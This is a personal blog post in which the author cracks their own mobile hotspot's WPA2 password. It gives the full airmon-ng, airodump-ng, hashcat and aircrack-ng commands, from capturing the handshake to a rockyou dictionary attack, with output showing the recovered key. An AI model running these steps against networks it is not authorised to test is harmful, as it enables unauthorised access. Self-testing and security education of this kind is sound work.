---
layout: post
title: Hacking my mobile hotspot with Aircrack-ng
---

This is my experience going through Brannon Dorsey's [great Wi-Fi cracking tutorial](https://github.com/brannondorsey/wifi-cracking) to hack my own mobile hotspot password. This is definitely not anything new but it appeared on Hacker News and I always wanted to learn how to use Aircrack-ng, so why not.

We will be sniffing out password hashes found in the WPA/WPA2 4-way handshake, which is performed when a client wants to authenticate itself to a WPA/WPA2 network using `airodump-ng`, and reversing the hash against a publicly available wordlist using `hashcat` or `aircrack-ng`.

We cannot use rainbow tables to reverse the hash effectively, as WPA/WPA2 uses the SSID as the salt for the hash. Instead, we rely on known weak popular passwords.

This tutorial is by no means well-prepared, as this is to merely outline the steps I took to perform my first Wi-Fi hack.

## Prerequisites

You will need a wireless card that supports monitor mode, as well as `airodump-ng` to monitor beacon frames from Wi-Fi routers.

You will also need one of these WPA/WPA2 hash reversing tools:

- `hashcat` (uses GPU, recommended)
    - Requires OpenCL (not working for me on Kali Linux)
- `aircrack-ng` (uses CPU)

## Walkthrough

First, start the monitor.

```console
root@sm15-kali:~# airmon-ng start wlan0

PHY	Interface	Driver		Chipset

phy0	wlan0mon	ath10k_pci	Qualcomm Atheros QCA6174 802.11ac Wireless Network Adapter (rev 20)

```

The interface here is `wlan0mon`, which can be verified with `iwconfig`.

Use `airodump-ng wlan0mon` to view all available Wifi networks. Identify your target and pick out the BSSID and Channel.

```console
root@sm15-kali:~# airodump-ng wlan0mon
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
2E:0E:3D:E4:35:76  -43       11        0    0  11  54e  WPA2 CCMP   PSK  IrvinAP
```

Next, keep monitoring the target until we can intercept a 4-way handshake, using the BSSID and Channel number retrieved earlier:

```console
root@sm15-kali:~# airodump-ng -c 6 --bssid 2E:0E:3D:E4:35:76 -w . wlan0mon

 CH  6 ][ Elapsed: 36 s ][ 2017-07-25 03:49 ][ WPA handshake: 2E:0E:3D:E4:35:76                                         
                                                                                                                                                               
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                               
 2E:0E:3D:E4:35:76  -48 100      353      148    0   6  54e  WPA2 CCMP   PSK  IrvinAP                                                                          
                                                                                                                                                               
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                     
                                                                                                                                                               
 2E:0E:3D:E4:35:76  60:F8:1D:AD:A4:F8  -57    0e- 1e     0      183                                                                                             

```

Wait until you see `WPA handshake` in the top line, which indicates that a client is initiating an authentication attempt to the router. Most likely the password sniffed should be correct, as devices connect to Wifi networks nowadays.

You will get some network capture files in your current directory:

```console
root@sm15-kali:~# ls -la
total 892
drwxr-xr-x 26 root root   4096 Jul 25 03:48 .
drwxr-xr-x 23 root root   4096 Jul 18 20:10 ..
-rw-r--r--  1 root root 457187 Jul 25 02:40 .-01.cap
-rw-r--r--  1 root root    584 Jul 25 02:40 .-01.csv
-rw-r--r--  1 root root    602 Jul 25 02:40 .-01.kismet.csv
-rw-r--r--  1 root root   3849 Jul 25 02:40 .-01.kismet.netxml
-rw-r--r--  1 root root    476 Jul 25 03:28 .-02.csv
-rw-r--r--  1 root root    589 Jul 25 03:28 .-02.kismet.csv
-rw-r--r--  1 root root   2745 Jul 25 03:28 .-02.kismet.netxml
...
```

Now you can reverse the WPA/WPA2 hash which is stored in the `.cap` file, with either `hashcat` or `aircrack-ng`. But first, download a wordlist, such as [Rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt), which will be our source of keys that will be manually brute forced.

### `hashcat`

`hashcat` didn't work for me on Kali, so I used my Mac to do this instead. To install `hashcat` on a Mac, I followed [these instructions](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going/).

```
git clone https://github.com/hashcat/hashcat.git
mkdir -p hashcat/deps
git clone https://github.com/KhronosGroup/OpenCL-Headers.git hashcat/deps/OpenCL
cd hashcat/
make
```

Verify that your installation works by running one of the example scripts such as `example0.sh`.

Convert your `.cap` file to a `.hccapx` file first with `cap2hccapx` (download from [`hashcat-utils`](https://github.com/hashcat/hashcat-utils/releases/download/v1.8/hashcat-utils-1.8.7z)).

Finally, we can execute the reversal:

```console
(pypy-venv) mbp14-osx:hashcat irvin$ ./hashcat -m 2500 IrvinAP.hccapx ../naive-hashcat/dicts/rockyou.txt
hashcat (v3.6.0-265-ga85be1d0) starting...

OpenCL Platform #1: Apple
=========================
* Device #1: Intel(R) Core(TM) i7-4870HQ CPU @ 2.50GHz, skipped.
* Device #2: Iris Pro, 384/1536 MB allocatable, 40MCU
* Device #3: GeForce GT 750M, 512/2048 MB allocatable, 2MCU

Hashes: 4 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger disabled.
Watchdog: Temperature retain trigger disabled.

Dictionary cache hit:
* Filename..: ../naive-hashcat/dicts/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

59c75d223c3a28d5f813759b68597a08:2e0e3de43576:60f81dada4f8:IrvinAP:curryrice
ed6b58543af52685a7f179778ad38e7f:2e0e3de43576:60f81dada4f8:IrvinAP:curryrice

Session..........: hashcat
Status...........: Cracked
Hash.Type........: WPA/WPA2
Hash.Target......: /Users/irvin/Google Drive/IrvinAP.hccapx
Time.Started.....: Tue Jul 25 03:32:58 2017 (53 secs)
Time.Estimated...: Tue Jul 25 03:33:51 2017 (0 secs)
Guess.Base.......: File (../naive-hashcat/dicts/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#2.....:     5789 H/s (16.27ms)
Speed.Dev.#3.....:     4628 H/s (6.70ms)
Speed.Dev.#*.....:    10416 H/s
Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 1173908/14344384 (8.18%)
Rejected.........: 620948/1173908 (52.90%)
Restore.Point....: 886805/14344384 (6.18%)
Candidates.#2....: elainemcg -> FARMERS1
Candidates.#3....: woolshed -> wardriver

Started: Tue Jul 25 03:32:53 2017
Stopped: Tue Jul 25 03:33:52 2017
```

We found a match - `curryrice`!

### `aircrack-ng`

Alternatively, we can use the bundled `aircrack-ng` tool in the whole Aircrack-ng Wi-Fi cracking suite to reverse our hashes. This is already preinstalled on Kali, so no worries here.

However, as compared to `hashcat`, `aircrack-ng` runs completely on the CPU so expect it to be much slower. It took me over 100 seconds on my Aftershock SM-15 (i7-4720HQ CPU @ 2.60GHz) to complete the cracking, as compared to 60 seconds on my Mac (i7-4870HQ CPU @ 2.50GHz).

```console
root@sm15-kali:~# aircrack-ng -a2 -b 2E:0E:3D:E4:35:76 -w bin/naive-hashcat/dicts/rockyou.txt IrvinAP.cap
Opening IrvinAP.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc4

      [00:01:46] 461632/9822769 keys tested (4343.99 k/s) 

      Time left: 35 minutes, 55 seconds                          4.70%

                           KEY FOUND! [ curryrice ]


      Master Key     : 63 BE 50 BB 49 39 20 91 CB F6 3A E9 87 55 E7 D7 
                       DB F1 70 DB 05 0E 7A 40 01 B4 AB B4 2B 94 78 FD 

      Transient Key  : 4D 2C 6B EA B7 AF D3 38 4E 5B 69 BB 6C 36 F0 0E 
                       15 73 16 47 A8 73 C6 F6 6E 35 07 D6 0E D4 B5 AA 
                       97 7A AF 6A 77 86 C8 D5 A0 A4 9C 7F FF 23 92 32 
                       07 5B 14 1A BC 6D F9 AF 33 6D 14 A7 2E D7 57 37 

      EAPOL HMAC     : F8 0D EC 1A AD 90 D8 67 A4 36 E2 95 A0 44 27 08 

```

## Conclusion

I was pleasantly surprised to find that my actual mobile hotspot password (which I am fully aware of how weak it is) is present in the wordlist. This prompted me to change it to something much more secure yet easy to type in.

Nonetheless, the success of such a method of cracking password hashes (regardless of WPA/WPA2 or whatever) is only dependent on how weak **and** common the passwords are. My actual router in my room has a much more obscure password (but still weak nonetheless), and I did not manage to crack the password there.

Anyway this was a great exercise in hacking which didn't take up much time! Would encourage anyone to try this, and subsequently go research about how all these tools work.

Until next time!
